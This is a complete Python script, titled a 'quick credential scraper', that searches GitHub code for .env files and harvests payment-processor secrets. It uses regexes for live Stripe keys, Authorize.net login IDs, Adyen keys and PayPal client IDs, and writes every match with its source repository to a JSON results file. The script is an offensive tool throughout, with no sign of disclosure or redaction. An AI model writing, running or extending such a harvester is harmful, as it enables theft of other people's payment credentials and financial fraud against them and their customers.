#!/usr/bin/env python3
"""Quick credential scraper - faster version with limited searches."""

import json
import re
import time
from datetime import datetime
from pathlib import Path

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

PATTERNS = {
    'stripe_live': r'sk_live_[a-zA-Z0-9]{24,40}',
    'stripe_test': r'sk_test_[a-zA-Z0-9]{24,40}',
    'authnet': r'(?:x_login|api_login_id)["\']?\s*[:=]\s*["\']?([\w\-]{8,30})["\']?',
    'adyen': r'AyShY[a-zA-Z0-9_\-\s]{40,}',
    'paypal': r'(?:client_id)["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_\-]{20,50})["\']?',
}

QUERIES = [
    'stripe api key path:.env',
    'authorize.net path:.env',
    'adyen api key path:.env',
]

class QuickScraper:
    def __init__(self):
        self.found = []
        self.seen = set()
        
    def fetch(self, url):
        """Fetch URL with timeout"""
        try:
            if HAS_REQUESTS:
                return requests.get(url, timeout=8).text
            else:
                import urllib.request
                with urllib.request.urlopen(url, timeout=8) as r:
                    return r.read().decode('utf-8', errors='ignore')
        except:
            return ""
    
    def scan(self, content, source):
        """Scan content for patterns"""
        for gate, pattern in PATTERNS.items():
            for match in re.finditer(pattern, content, re.IGNORECASE):
                value = match.group(1) if match.groups() else match.group(0)
                value = value.strip().strip('"\'')
                
                if value and value not in self.seen:
                    self.seen.add(value)
                    self.found.append({
                        'gate': gate.replace('_live', '').replace('_test', ''),
                        'type': gate,
                        'value': value,
                        'source': source,
                        'found_at': datetime.now().isoformat(),
                    })
                    print(f"✅ {gate}: {value[:25]}...")
    
    def run(self):
        """Run quick scrape"""
        print("=" * 60)
        print("🔍 QUICK CREDENTIAL SCRAPER")
        print("=" * 60)
        
        # GitHub search
        for query in QUERIES:
            print(f"\n📡 Searching: {query}")
            url = f"https://api.github.com/search/code?q={query}&per_page=50"
            
            try:
                data = json.loads(self.fetch(url))
                items = data.get('items', [])[:10]
                
                for item in items:
                    path = item.get('path', '')
                    if path.endswith(('.env', '.py', '.json', '.yaml')):
                        git_url = item.get('git_url', '').replace('git://', 'https://')
                        repo = item.get('repository', {}).get('full_name', '')
                        
                        content = self.fetch(git_url)
                        if content:
                            self.scan(content, f"GitHub:{repo}/{path}")
                    
                    time.sleep(0.5)
            except Exception as e:
                print(f"  ⚠️  Error: {e}")
        
        # Save results
        if self.found:
            output = {
                'scraped_at': datetime.now().isoformat(),
                'total': len(self.found),
                'credentials': self.found,
            }
            Path('quick_scrape_results.json').write_text(json.dumps(output, indent=2))
            print(f"\n✅ Found {len(self.found)} credentials")
            print(f"📁 Saved to quick_scrape_results.json")
        else:
            print("\n❌ No credentials found")

if __name__ == '__main__':
    QuickScraper().run()
